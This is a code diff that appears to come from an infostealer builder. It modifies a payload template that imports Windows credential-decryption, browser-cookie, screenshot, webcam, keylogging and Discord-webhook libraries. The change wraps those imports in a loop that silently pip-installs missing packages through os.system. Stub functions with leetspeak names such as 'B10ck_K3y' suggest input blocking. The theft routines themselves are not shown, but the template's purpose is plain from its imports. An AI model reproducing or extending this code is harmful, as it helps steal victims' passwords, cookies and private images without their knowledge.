@@ -14,41 +14,85 @@
 
 
 Obligatory = r'''
-import os
-import platform
-import ctypes
-from screeninfo import *
-import psutil
-import GPUtil
-import sqlite3
-from urllib.request import Request, urlopen
-import json
-from json import *
-import socket
-import requests
-from Crypto.Cipher import AES
-import subprocess
-import datetime
-import base64
-import re
-import string
-import win32api
-import discord
-from discord import Embed, File, SyncWebhook
-import sys
-import shutil
-from pathlib import Path
-from zipfile import ZipFile
-from win32crypt import CryptUnprotectData
-import uuid
-from PIL import ImageGrab
-import time
-import browser_cookie3
-import cv2
-import pyautogui
-import keyboard
-import threading
-from tkinter import messagebox
+while True:
+    import os
+    try:
+        import platform
+        import ctypes
+        from screeninfo import *
+        import psutil
+        import GPUtil
+        import sqlite3
+        from urllib.request import Request, urlopen
+        import json
+        from json import *
+        import socket
+        import requests
+        from Crypto.Cipher import AES
+        import subprocess
+        import datetime
+        import base64
+        import re
+        import string
+        import win32api
+        import discord
+        from discord import Embed, File, SyncWebhook
+        import sys
+        import shutil
+        from pathlib import Path
+        from zipfile import ZipFile
+        from win32crypt import CryptUnprotectData
+        import uuid
+        from PIL import ImageGrab
+        import time
+        import browser_cookie3
+        import cv2
+        import pyautogui
+        import keyboard
+        import threading
+        from tkinter import messagebox
+        break
+    except:
+        modules = [
+            "setuptools",
+            "--upgrade pip setuptools wheel",
+            "pyinstaller",
+            "pyinstaller --upgrade",
+            "platform",
+            "ctypes",
+            "screeninfo",
+            "psutil",
+            "GPUtil",
+            "sqlite3",
+            "urllib3",
+            "json",
+            "socket",
+            "requests",
+            "pycryptodome",
+            "subprocess",
+            "datetime",
+            "base64",
+            "re",
+            "string",
+            "pypiwin32",
+            "discord",
+            "discord.py",
+            "--upgrade discord.py",
+            "shutil",
+            "pathlib",
+            "pillow",
+            "pycryptodome",
+            "uuid",
+            "Pillow",
+            "browser-cookie3",
+            "opencv-python",
+            "pyautogui",
+            "keyboard",
+            "tkinter"
+        ]
+
+        for module in modules:
+            os.system(f"pip install {module}")
 
 def B10ck_K3y(): pass
 def Unb10ck_K3y(): pass
